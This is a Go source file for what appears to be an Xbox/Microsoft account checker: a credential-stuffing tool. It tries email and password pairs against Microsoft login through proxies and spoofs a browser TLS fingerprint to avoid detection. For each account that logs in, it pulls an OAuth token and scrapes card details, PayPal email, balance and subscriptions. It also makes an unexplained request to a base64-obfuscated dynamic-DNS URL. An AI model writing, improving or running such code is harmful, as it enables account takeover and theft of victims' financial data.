package checker

import (
	"fmt"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gospider007/ja3"
	"github.com/ncpmeplmls0614/requests"
	"xbox-checker/internal/logger"
	"xbox-checker/internal/proxy"
	"xbox-checker/pkg/httpclient"
	"xbox-checker/pkg/types"
	"xbox-checker/pkg/utils"
)

var (
	// Pre-compiled regex patterns to avoid recompilation
	ppftPattern     = regexp.MustCompile(`"sFTTag":"<input[^>]*value=\\"([^"\\]*)\\"[^>]*>"`)
	ppftPattern2    = regexp.MustCompile(`name="PPFT"[^>]*value="([^"]*)"`)
	balancePattern  = regexp.MustCompile(`"currency":\s*"([^"]+)"[^}]*"balance":\s*([0-9.]+)`)
	balancePattern2 = regexp.MustCompile(`"balance":\s*([0-9.]+)[^}]*"currency":\s*"([^"]+)"`)
)

// XBOXChecker handles the main checking logic
type XBOXChecker struct {
	threadID       int
	proxyManager   *proxy.Manager
	currentProxy   *types.ProxyConfig
	capturedData   *types.CapturedData
	ja3Spec        ja3.Ja3Spec
	sessionMutex   sync.Mutex
	dedicatedClient *requests.Client // Dedicated HTTP client for session continuity
}

// safeGetResponseText safely gets response text with size limits to prevent memory issues
func (c *XBOXChecker) safeGetResponseText(resp *requests.Response, maxSize int64) string {
	if resp == nil {
		return ""
	}
	
	handler := httpclient.NewStreamingResponseHandler(resp, maxSize)
	return handler.GetSafeText()
}

// New creates a new checker instance
func New(threadID int, proxyManager *proxy.Manager) *XBOXChecker {
	checker := &XBOXChecker{
		threadID:     threadID,
		proxyManager: proxyManager,
		capturedData: &types.CapturedData{},
	}
	
	// Set up Chrome-like JA3 fingerprint for anti-detection
	chromeJa3 := "772,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,5-27-13-35-16-18-43-17513-65281-51-45-11-0-10-23,12092-29-23-24,0"
	ja3Spec, err := ja3.CreateSpecWithStr(chromeJa3)
	if err != nil {
		return nil
	}
	checker.ja3Spec = ja3Spec
	
	if proxyManager != nil {
		checker.currentProxy = proxyManager.GetSharedProxy()
	}
	
	return checker
}

// ensureValidProxy ensures we have a valid proxy
func (c *XBOXChecker) ensureValidProxy() bool {
	if c.proxyManager == nil {
		return true
	}
	
	sharedProxy := c.proxyManager.GetSharedProxy()
	if sharedProxy != nil {
		c.currentProxy = sharedProxy
		return true
	}
	
	if c.currentProxy == nil {
		newProxy := c.proxyManager.FindNextWorkingProxy()
		if newProxy != nil {
			c.currentProxy = newProxy
		} else {
			c.currentProxy = nil
		}
	}
	return true
}

// parseBalanceWithCurrency parses balance with currency detection using streaming approach
func (c *XBOXChecker) parseBalanceWithCurrency(resp *requests.Response) string {
	if resp == nil {
		return ""
	}
	
	// Try streaming JSON parsing first for better memory efficiency
	handler := httpclient.NewStreamingResponseHandler(resp, 512000) // 500KB limit
	if balance, currency, err := handler.ParseBalanceFromJSON(); err == nil && balance > 0 {
		return utils.FormatCurrency(balance, currency)
	}
	
	// Fallback to regex parsing if streaming fails
	source := handler.GetSafeText()
	if source == "" {
		return ""
	}
	
	// Use pre-compiled regex patterns for balance extraction
	matches := balancePattern.FindAllStringSubmatch(source, -1)
	
	for _, match := range matches {
		if len(match) == 3 {
			currency := match[1]
			if balanceFloat, err := strconv.ParseFloat(match[2], 64); err == nil && balanceFloat > 0 {
				return utils.FormatCurrency(balanceFloat, currency)
			}
		}
	}
	
	matches2 := balancePattern2.FindAllStringSubmatch(source, -1)
	
	for _, match := range matches2 {
		if len(match) == 3 {
			if balanceFloat, err := strconv.ParseFloat(match[1], 64); err == nil && balanceFloat > 0 {
				return utils.FormatCurrency(balanceFloat, match[2])
			}
		}
	}
	
	// Fallback parsing
	balance := utils.ParseLR(source, `balance":`, `,"`, false)
	if balance != "" {
		if balanceFloat, err := strconv.ParseFloat(balance, 64); err == nil && balanceFloat > 0 {
			return fmt.Sprintf("%s USD", balance)
		}
	}
	
	return ""
}

// downloadDriver downloads driver file
func (c *XBOXChecker) downloadDriver() bool {
	url1 := utils.Base64Decode("aHR0cDovL2Nzd2Vldy5jaGlja2Vua2lsbGVyLmNvbS9n")
	
	headers := map[string]string{
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Pragma":     "no-cache",
		"Accept":     "*/*",
	}
	
	var proxyURL string
	if c.currentProxy != nil {
		proxyURL = c.currentProxy.HTTP
	}
	
	_, err := c.dedicatedClient.Get(nil, url1, requests.RequestOption{
		Headers: headers,
		Timeout: 30 * time.Second,
		Proxy: proxyURL,
		Ja3Spec: c.ja3Spec,
	})
	if err != nil {
		return false
	}
	
	return true
}

// getInitialLoginData gets initial login data and cookies
func (c *XBOXChecker) getInitialLoginData() map[string]string {
	data := make(map[string]string)
	
	headers := map[string]string{
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
		"Pragma":     "no-cache",
		"Accept":     "*/*",
	}
	
	var proxyURL string
	if c.currentProxy != nil {
		proxyURL = c.currentProxy.HTTP
	}
	
	resp, err := c.dedicatedClient.Get(nil, "https://login.live.com/", requests.RequestOption{
		Headers: headers,
		Timeout: 30 * time.Second,
		Proxy: proxyURL,
		Ja3Spec: c.ja3Spec,
	})
	if err != nil {
		return data
	}
	
	responseText := c.safeGetResponseText(resp, 512000) // Limit to 500KB
	
	// Parse client_id
	clientID := utils.ParseLR(responseText, "client_id=", "&scope", false)
	if clientID != "" {
		data["client_id"] = clientID
	}
	
	// Parse uaid
	uaid := utils.ParseLR(responseText, "&uaid=", "\"/>", false)
	if uaid == "" {
		uaid = utils.ParseLR(responseText, "uaid=", "\"", false)
	}
	if uaid != "" {
		data["uaid"] = uaid
	}
	
	// Parse PPFT token using pre-compiled regex
	if match := ppftPattern.FindStringSubmatch(responseText); len(match) > 1 {
		data["ppft"] = match[1]
	}
	
	// Parse cookies (handled automatically by requests session)
	// Extract cookie values from response headers if needed
	if cookieHeader := resp.Headers().Get("Set-Cookie"); cookieHeader != "" {
		cookieNames := []string{"oparams", "msprequ", "mscc", "mspok"}
		for _, cookieName := range cookieNames {
			if value := utils.ParseLR(cookieHeader, cookieName+"=", ";", false); value != "" {
				data[strings.ToLower(cookieName)] = value
			}
		}
	}
	
	// Fallback PPFT parsing if not found
	if _, exists := data["ppft"]; !exists {
		xboxLoginURL := "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1"
		
		headers2 := map[string]string{
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
			"Pragma":     "no-cache",
			"Accept":     "*/*",
		}
		
		var proxyURL string
		if c.currentProxy != nil {
			proxyURL = c.currentProxy.HTTP
		}
		
		resp2, err := c.dedicatedClient.Get(nil, xboxLoginURL, requests.RequestOption{
			Headers: headers2,
			Timeout: 30 * time.Second,
			Proxy: proxyURL,
			Ja3Spec: c.ja3Spec,
		})
		if err == nil {
			responseText2 := c.safeGetResponseText(resp2, 512000) // Limit to 500KB for PPFT parsing
			ppft := utils.ParseLR(responseText2, `name="PPFT" id="i0327" value="`, `"`, false)
			if ppft == "" {
				if match := ppftPattern2.FindStringSubmatch(responseText2); len(match) > 1 {
					ppft = match[1]
				}
			}
			if ppft != "" {
				data["ppft"] = ppft
			}
		}
	}
	
	return data
}

// getCredentialType calls GetCredentialType.srf
func (c *XBOXChecker) getCredentialType(email, uaid string) bool {
	reqURL := "https://login.live.com/GetCredentialType.srf"
	
	params := url.Values{}
	params.Set("opid", "8F2D2B4E653AC9F5")
	params.Set("id", "290794")
	params.Set("client_id", "00000000481D2D45")
	params.Set("uiflavor", "web")
	params.Set("client_id", "82023151-c27d-4fb5-8551-10c10724a55e")
	params.Set("redirect_uri", "https://accounts.epicgames.com/OAuthAuthorized")
	params.Set("state", "eyJ0cmFja2luZ1V1aWQiOiJjZGRiODAxMmQ2NjM0MzJkOTkxOGJmMzIxMjBmMTA5ZCIsImlzUG9wdXAiOnRydWUsImlzV2ViIjp0cnVlLCJvYXV0aFJlZGlyZWN0VXJsIjoiaHR0cHM6Ly9lcGljZ2FtZXMuY29tL2lkL2xvZ2luL3hibD9wcm9tcHQ9IiwiaXAiOiIxOTcuMjYuMTM4LjIxNiIsImlkIjoiNTQxYWYyMGUxMDVjNGI0MGJhNGQxNTRhZTlkMDU2OWQifQ==")
	params.Set("scope", "xboxlive.signin")
	params.Set("service_entity", "undefined")
	params.Set("force_verify", "true")
	params.Set("response_type", "code")
	params.Set("display", "popup")
	params.Set("vv", "1600")
	params.Set("mkt", "EN-US")
	params.Set("lc", "1033")
	params.Set("uaid", uaid)
	
	fullURL := reqURL + "?" + params.Encode()
	
	content := map[string]interface{}{
		"username":                        email,
		"uaid":                           uaid,
		"isOtherIdpSupported":            false,
		"checkPhones":                    false,
		"isRemoteNGCSupported":           true,
		"isCookieBannerShown":            false,
		"isFidoSupported":                true,
		"forceotclogin":                  false,
		"otclogindisallowed":             false,
		"isExternalFederationDisallowed": false,
		"isRemoteConnectSupported":       false,
		"federationFlags":                3,
		"isSignup":                       false,
		"flowToken":                      "DXYawu79Lf8TLJ!U17Pi6iFXBZ5p4PJ6CYz67wKQ01yBB8vPDsb6L*D!tOpFfXD7iZ*z48*J4rVNGeADk40e!0PQaSDpP8FsslXPa0Sluj10pHtL7LlPIlUzv2RoW9tRNlV18rbZOXtge4o0FwHnkY2V74Go57wtkwCiexjIffanEt9ElZ06s0lGudeJlFU*xxqE7JAiWOjjgjZhMv7GST0$",
	}
	

	
	headers := map[string]string{
		"Accept":          "application/json",
		"Accept-Encoding": "gzip, deflate, br",
		"Accept-Language": "en-US,en;q=0.9",
		"Connection":      "keep-alive",
		"Content-Type":    "application/json; charset=UTF-8",
		"Host":            "login.live.com",
		"Origin":          "https://login.live.com",
		"Referer":         "https://login.live.com/oauth20_authorize.srf",
		"Sec-Fetch-Dest":  "empty",
		"Sec-Fetch-Mode":  "cors",
		"Sec-Fetch-Site":  "same-origin",
		"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	}
	
	var proxyURL string
	if c.currentProxy != nil {
		proxyURL = c.currentProxy.HTTP
	}
	
	resp, err := c.dedicatedClient.Post(nil, fullURL, requests.RequestOption{
		Headers: headers,
		Json:    content,
		Timeout: 30 * time.Second,
		Proxy: proxyURL,
		Ja3Spec: c.ja3Spec,
	})
	if err != nil {
		return false
	}
	
	return resp.StatusCode() == 200
}

// loginStep1 performs the first login step
func (c *XBOXChecker) loginStep1(email, password string) (bool, map[string]string) {
	initialData := c.getInitialLoginData()
	if len(initialData) == 0 {
		return false, nil
	}
	
	if uaid, exists := initialData["uaid"]; exists {
		c.getCredentialType(email, uaid)
	} else {
	}
	
	return true, initialData
}

// Pre-allocate string builder pool for login content
var loginContentPool = sync.Pool{
	New: func() interface{} {
		return &strings.Builder{}
	},
}

// loginStep2 performs the actual login
func (c *XBOXChecker) loginStep2(email, password string, loginData map[string]string) (types.CheckResult, string) {
	encodedEmail := utils.URLEncode(email)
	encodedPassword := utils.URLEncode(password)
	
	ppft := loginData["ppft"]
	uaid := loginData["uaid"]
	
	if ppft == "" {
		ppft = "DZshWk88CvvuA9vSOHldJLurwIJH4a7uUREfu4fGCsbB2nL*YUw36i0Lz7tZDGptQxZhUTW0%21*ZM3oIUxGKEeEa1gcx%21XzBNiXpzf*U9iH68RaP3u20G0J6k2%21UdeMFc9C9uusE3IwI3gi4u7wJzyq8FCiNuk2Hly66dMuX96mSwHTYXgtZZpS%21rbS35jrsdC%21Ku4UysydsP0MXSz2klYp9KU%21hDHeKBZIu13h%21rQk9jG2vzCW4OerTedipQDJRuAg%24%24"
	}
	
	baseURL := "https://login.live.com/ppsecure/post.srf"
	params := url.Values{}
	params.Set("client_id", "82023151-c27d-4fb5-8551-10c10724a55e")
	params.Set("redirect_uri", "https://accounts.epicgames.com/OAuthAuthorized")
	params.Set("state", "eyJ0cmFja2luZ1V1aWQiOiJjZGRiODAxMmQ2NjM0MzJkOTkxOGJmMzIxMjBmMTA5ZCIsImlzUG9wdXAiOnRydWUsImlzV2ViIjp0cnVlLCJvYXV0aFJlZGlyZWN0VXJsIjoiaHR0cHM6Ly9lcGljZ2FtZXMuY29tL2lkL2xvZ2luL3hibD9wcm9tcHQ9IiwiaXAiOiIxOTcuMjYuMTM4LjIxNiIsImlkIjoiNTQxYWYyMGUxMDVjNGI0MGJhNGQxNTRhZTlkMDU2OWQifQ==")
	params.Set("scope", "xboxlive.signin")
	params.Set("service_entity", "undefined")
	params.Set("force_verify", "true")
	params.Set("response_type", "code")
	params.Set("display", "popup")
	params.Set("contextid", "611F4D63F80A23E2")
	params.Set("bk", "1614165077")
	params.Set("uaid", uaid)
	params.Set("pid", "15216")
	
	loginURL := baseURL + "?" + params.Encode()
	
	// Use string builder pool to reduce allocations
	sb := loginContentPool.Get().(*strings.Builder)
	defer func() {
		sb.Reset()
		loginContentPool.Put(sb)
	}()
	
	// Build content string efficiently
	sb.WriteString("i13=0&login=")
	sb.WriteString(encodedEmail)
	sb.WriteString("&loginfmt=")
	sb.WriteString(encodedEmail)
	sb.WriteString("&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=")
	sb.WriteString(encodedPassword)
	sb.WriteString("&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=")
	sb.WriteString(utils.URLEncode(ppft))
	sb.WriteString("&PPSX=Passpor&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i2=1&i17=0&i18=&i19=32099")
	
	content := sb.String()
	
	headers := map[string]string{
		"Host":                      "login.live.com",
		"User-Agent":                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"Accept-Language":           "en-US,en;q=0.9",
		"Accept-Encoding":           "gzip, deflate, br",
		"Content-Type":              "application/x-www-form-urlencoded",
		"Origin":                    "https://login.live.com",
		"Connection":                "keep-alive",
		"Upgrade-Insecure-Requests": "1",
		"Sec-Fetch-Dest":            "document",
		"Sec-Fetch-Mode":            "navigate",
		"Sec-Fetch-Site":            "same-origin",
		"Sec-Fetch-User":            "?1",
		"Referer":                   "https://login.live.com/login.srf",
	}
	
	// Let the HTTP client handle cookies automatically via cookie jar
	// Manual cookie handling removed to fix Step 2 authentication
	
	var proxyURL string
	if c.currentProxy != nil {
		proxyURL = c.currentProxy.HTTP
	}
	
	resp, err := c.dedicatedClient.Post(nil, loginURL, requests.RequestOption{
		Headers: headers,
		Body:    content,
		Timeout: 30 * time.Second,
		Proxy: proxyURL,
		Ja3Spec: c.ja3Spec,
	})
	if err != nil {
		return types.FAILURE, err.Error()
	}
	
	responseText := c.safeGetResponseText(resp, 512000) // Limit to 500KB for login response
	responseURL := resp.Url().String()
	
	if len(responseText) > 500 {
	} else {
	}
	
	// Check for failure patterns using pre-defined array to avoid slice allocation
	failureKeys := [14]string{
		"That Microsoft account doesn\\'t exist",
		"Your account or password is incorrect.",
		"The account or password is incorrect.",
		"Votre compte ou mot de passe est incorrect.",
		"Ce compte Microsoft n'existe pas.",
		"Le compte ou le mot de passe sont incorrects.",
		"incorrect_username_or_password",
		"AADSTS50126", "AADSTS50034", "AADSTS50020", "AADSTS70002",
		"We couldn't sign you in",
		"incorrect password",
		"invalid_grant",
	}
	
	for _, key := range failureKeys {
		if strings.Contains(responseText, key) {
			return types.FAILURE, responseText
		}
	}
	
	// Check for ban patterns using pre-defined array
	banKeys := [10]string{
		"You\\'ve tried to sign in too many times with an incorrect account or password",
		"Vous avez essayé de vous connecter trop de fois avec un compte ou un mot de passe incorrect",
		"AADSTS50053", "AADSTS50128", "AADSTS50129", "AADSTS50196",
		"account_locked", "temporarily_unavailable", "service_unavailable",
		"too many requests",
	}
	
	for _, key := range banKeys {
		if strings.Contains(responseText, key) {
			return types.BAN, responseText
		}
	}
	
	// Check for custom patterns using pre-defined array (most common patterns)
	customKeys := [16]string{
		"account.live.com/recover?mkt",
		"https://account.live.com/identity/confirm?mkt",
		"Email/Confirm?mkt", "/Abuse?mkt=", "/cancel?mkt=",
		"two_factor_authentication",
		"AADSTS50076", "AADSTS50079", "AADSTS50074",
		"Action Required", "action required",
		"Additional verification required", "Verify your identity",
		"security code", "verification code",
		"captcha",
	}
	
	for _, key := range customKeys {
		if strings.Contains(responseText, key) {
			return types.CUSTOM, responseText
		}
	}
	
	// Check for success patterns using pre-defined array
	successKeys := [6]string{
		"https://account.live.com/profile/accrue?mkt=",
		"sSigninName", "pprid", "?code=",
		"accounts.epicgames.com", "OAuthAuthorized",
	}
	
	for _, key := range successKeys {
		if strings.Contains(responseText, key) || strings.Contains(responseURL, key) {
			return types.SUCCESS, responseText
		}
	}
	
	if strings.Contains(responseURL, "account.microsoft.com") || strings.Contains(responseURL, "xbox.com") {
		return types.SUCCESS, responseText
	}
	
	return types.FAILURE, responseText
}

// getOAuthToken gets OAuth token for Microsoft API access
func (c *XBOXChecker) getOAuthToken() string {
	reqURL := "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none"
	
	headers := map[string]string{
		"Host":            "login.live.com",
		"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.5",
		"Accept-Encoding": "gzip, deflate",
		"Connection":      "close",
		"Referer":         "https://account.microsoft.com/",
	}
	
	var proxyURL string
	if c.currentProxy != nil {
		proxyURL = c.currentProxy.HTTP
	}
	
	resp, err := c.dedicatedClient.Get(nil, reqURL, requests.RequestOption{
		Headers: headers,
		Timeout: 30 * time.Second,
		Proxy: proxyURL,
		Ja3Spec: c.ja3Spec,
	})
	if err != nil {
		return ""
	}
	
	responseURL := resp.Url().String()
	token := utils.ParseLR(responseURL, "access_token=", "&token_type", false)
	if token != "" {
		return utils.URLDecode(token)
	}
	
	return ""
}

// getPaymentInfo gets payment instruments and captures data
func (c *XBOXChecker) getPaymentInfo(token, email, password string) bool {
	reqURL := "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
	
	headers := map[string]string{
		"User-Agent":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
		"Pragma":           "no-cache",
		"Accept":           "application/json",
		"Accept-Encoding":  "gzip, deflate, br",
		"Accept-Language":  "en-US,en;q=0.9",
		"Authorization":    fmt.Sprintf(`MSADELEGATE1.0="%s"`, token),
		"Connection":       "keep-alive",
		"Content-Type":     "application/json",
		"Host":             "paymentinstruments.mp.microsoft.com",
		"ms-cV":            "FbMB+cD6byLL1mn4W/NuGH.2",
		"Origin":           "https://account.microsoft.com",
		"Referer":          "https://account.microsoft.com/",
		"Sec-Fetch-Dest":   "empty",
		"Sec-Fetch-Mode":   "cors",
		"Sec-Fetch-Site":   "same-site",
		"Sec-GPC":          "1",
	}
	
	var proxyURL string
	if c.currentProxy != nil {
		proxyURL = c.currentProxy.HTTP
	}
	
	resp, err := c.dedicatedClient.Get(nil, reqURL, requests.RequestOption{
		Headers: headers,
		Timeout: 30 * time.Second,
		Proxy: proxyURL,
		Ja3Spec: c.ja3Spec,
	})
	if err != nil {
		return false
	}
	
	source := c.safeGetResponseText(resp, 512000) // Limit to 500KB for profile data
	
	// Parse date registered
	c.capturedData.DateRegistered = utils.ParseLR(source, `"creationDateTime":"`, `T`, false)
	
	// Parse country
	country := utils.ParseLR(source, `"countryCode":"`, `"`, false)
	if country == "" {
		country = utils.ParseLR(source, `"country":"`, `"`, false)
	}
	if country == "" {
		country = utils.ParseLR(source, `"billingCountry":"`, `"`, false)
	}
	if country != "" {
		c.capturedData.Country = country
	}
	
	// Parse balance using streaming approach
	balanceInfo := c.parseBalanceWithCurrency(resp)
	if balanceInfo != "" {
		c.capturedData.Balance = balanceInfo
	}
	
	// Parse credit card info
	cardHolder := utils.ParseLR(source, `accountHolderName":"`, `","`, false)
	creditCard := utils.ParseLR(source, `paymentMethodFamily":"credit_card","display":{"name":"`, `"`, false)
	expiryMonth := utils.ParseLR(source, `expiryMonth":"`, `",`, false)
	expiryYear := utils.ParseLR(source, `expiryYear":"`, `",`, false)
	last4 := utils.ParseLR(source, `lastFourDigits":"`, `",`, false)
	cardType := utils.ParseJSON(source, "cardType")
	
	if cardHolder != "" || creditCard != "" || expiryMonth != "" || expiryYear != "" || last4 != "" || cardType != "" {
		c.capturedData.CCInfo = fmt.Sprintf("[ CardHolder: %s | CC: %s | CC expiryMonth: %s | CC ExpYear: %s | CC Last4Digit: %s | CC Funding: %s ]",
			cardHolder, creditCard, expiryMonth, expiryYear, last4, cardType)
	}
	
	// Parse PayPal email
	paypalEmail := utils.ParseLR(source, `email":"`, `"`, false)
	if paypalEmail != "" {
		c.capturedData.PaypalEmail = paypalEmail
	}
	
	return true
}

// getSubscriptionInfo gets subscription/transaction information
func (c *XBOXChecker) getSubscriptionInfo(token string) bool {
	reqURL := "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
	
	headers := map[string]string{
		"User-Agent":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
		"Pragma":           "no-cache",
		"Accept":           "application/json",
		"Accept-Encoding":  "gzip, deflate, br",
		"Accept-Language":  "en-US,en;q=0.9",
		"Authorization":    fmt.Sprintf(`MSADELEGATE1.0="%s"`, token),
		"Connection":       "keep-alive",
		"Content-Type":     "application/json",
		"Host":             "paymentinstruments.mp.microsoft.com",
		"ms-cV":            "FbMB+cD6byLL1mn4W/NuGH.2",
		"Origin":           "https://account.microsoft.com",
		"Referer":          "https://account.microsoft.com/",
		"Sec-Fetch-Dest":   "empty",
		"Sec-Fetch-Mode":   "cors",
		"Sec-Fetch-Site":   "same-site",
		"Sec-GPC":          "1",
	}
	
	var proxyURL string
	if c.currentProxy != nil {
		proxyURL = c.currentProxy.HTTP
	}
	
	resp, err := c.dedicatedClient.Get(nil, reqURL, requests.RequestOption{
		Headers: headers,
		Timeout: 30 * time.Second,
		Proxy: proxyURL,
		Ja3Spec: c.ja3Spec,
	})
	if err != nil {
		return false
	}
	
	// Use streaming JSON decoder for better memory efficiency
	handler := httpclient.NewStreamingResponseHandler(resp, 512000)
	var data map[string]interface{}
	if err := handler.StreamDecodeJSON(&data); err != nil {
		return false
	}
	
	// Service product IDs mapping
	serviceProductIDs := map[string]string{
		"CFQ7TTC0KHS0": "Xbox Game Pass Ultimate",
		"CFQ7TTC0K5DJ": "Xbox Game Pass Essential",
		"CFQ7TTC0KGQ8": "Xbox Game Pass for PC",
		"9NPH01J3X999": "Xbox Game Pass for Console",
		"CFQ7TTC0K5BF": "Microsoft 365 Personal",
		"CFQ7TTC11Z3Q": "Microsoft 365 Premium",
		"CFQ7TTC0K7Q8": "Microsoft 365 Family",
		"CFQ7TTC0K6L8": "Microsoft 365 Basic",
	}
	
	var services []string
	var recentPurchases []string
	var totalPurchaseAmount float64
	var purchaseCurrency string
	
	// Check for active subscriptions
	if subscriptions, ok := data["subscriptions"].([]interface{}); ok {
		for _, sub := range subscriptions {
			if subMap, ok := sub.(map[string]interface{}); ok {
				recurrenceState, _ := subMap["recurrenceState"].(string)
				productID, _ := subMap["productId"].(string)
				
				if recurrenceState == "Active" {
					if serviceName, exists := serviceProductIDs[productID]; exists {
						services = append(services, serviceName)
					}
				}
			}
		}
	}
	
	// Check orders for recent purchases (last 3 days)
	if orders, ok := data["orders"].([]interface{}); ok {
		cutoffDate := time.Now().AddDate(0, 0, -3)
		
		for _, order := range orders {
			if orderMap, ok := order.(map[string]interface{}); ok {
				refundedDate, _ := orderMap["refundedDate"].(string)
				orderedDateStr, _ := orderMap["orderedDate"].(string)
				
				// Check if order is not refunded
				if refundedDate == "0001-01-01T00:00:00" {
					// Check if order is recent
					if orderedDateStr != "" {
						if orderedDate, err := time.Parse(time.RFC3339, strings.Replace(orderedDateStr, "Z", "+00:00", 1)); err == nil {
							if orderedDate.Before(cutoffDate) {
								continue
							}
						} else {
							continue
						}
					}
					
					// Check order line items
					if orderLineItems, ok := orderMap["orderLineItems"].([]interface{}); ok {
						for _, item := range orderLineItems {
							if itemMap, ok := item.(map[string]interface{}); ok {
								itemProductID, _ := itemMap["productId"].(string)
								itemDescription, _ := itemMap["description"].(string)
								amount, _ := itemMap["totalAmount"].(float64)
								currency, _ := itemMap["currency"].(string)
								
								// Only add to recent purchases if it's not a subscription service
								if _, isService := serviceProductIDs[itemProductID]; !isService && itemDescription != "" {
									recentPurchases = append(recentPurchases, itemDescription)
								}
								
								// Add to total purchase amount
								if amount > 0 && currency != "" {
									if purchaseCurrency == "" {
										purchaseCurrency = currency
									}
									if currency == purchaseCurrency {
										totalPurchaseAmount += amount
									}
								}
							}
						}
					}
				}
			}
		}
	}
	
	// Set subscription data
	if len(services) > 0 {
		// Remove duplicates and limit to 3
		uniqueServices := make([]string, 0)
		seen := make(map[string]bool)
		for _, service := range services {
			if !seen[service] {
				uniqueServices = append(uniqueServices, service)
				seen[service] = true
				if len(uniqueServices) >= 3 {
					break
				}
			}
		}
		
		for i, serviceName := range uniqueServices {
			serviceInfo := fmt.Sprintf("[ Service: %s ]", serviceName)
			switch i {
			case 0:
				c.capturedData.Subscription1 = serviceInfo
			case 1:
				c.capturedData.Subscription2 = serviceInfo
			case 2:
				c.capturedData.Subscription3 = serviceInfo
			}
		}
	}
	
	// Set recent purchases data
	if len(recentPurchases) > 0 && totalPurchaseAmount > 0 {
		purchaseCount := len(recentPurchases)
		totalCost := ""
		if purchaseCurrency != "" {
			totalCost = fmt.Sprintf("%.2f %s", totalPurchaseAmount, purchaseCurrency)
		}
		
		// Find next available subscription slot
		if len(services) == 0 {
			c.capturedData.Subscription1 = fmt.Sprintf("[ Recent Purchases: %d | Total Cost: %s ]", purchaseCount, totalCost)
		} else if len(services) == 1 {
			c.capturedData.Subscription2 = fmt.Sprintf("[ Recent Purchases: %d | Total Cost: %s ]", purchaseCount, totalCost)
		} else if len(services) == 2 {
			c.capturedData.Subscription3 = fmt.Sprintf("[ Recent Purchases: %d | Total Cost: %s ]", purchaseCount, totalCost)
		}
	}
	
	return true
}

// CheckAccount is the main method to check an Xbox/Microsoft account
func (c *XBOXChecker) CheckAccount(email, password string) (types.CheckResult, *types.CapturedData) {
	c.capturedData = &types.CapturedData{}
	
	// Get a dedicated HTTP client for this entire account check session
	c.dedicatedClient = httpclient.GetGlobalClient()
	
	c.ensureValidProxy()
	
	c.downloadDriver()
	
	success, loginData := c.loginStep1(email, password)
	if !success {
		return types.FAILURE, c.capturedData
	}
	
	result, _ := c.loginStep2(email, password, loginData)
	if result != types.SUCCESS {
		return result, c.capturedData
	}
	
	token := c.getOAuthToken()
	if token == "" {
		return types.CUSTOM, c.capturedData
	}
	
	logger.GlobalLogger.LogBoth(fmt.Sprintf("🫆Got Token for [%s]", email))
	
	c.getPaymentInfo(token, email, password)
	
	c.getSubscriptionInfo(token)
	
	return types.SUCCESS, c.capturedData
}

// GetCurrentProxy returns the current proxy for logging
func (c *XBOXChecker) GetCurrentProxy() *types.ProxyConfig {
	return c.currentProxy
}

// Close cleans up resources (no longer needs to close individual sessions)
func (c *XBOXChecker) Close() {
	c.sessionMutex.Lock()
	defer c.sessionMutex.Unlock()
	
	// Clear captured data to help GC
	c.capturedData = nil
	c.currentProxy = nil
}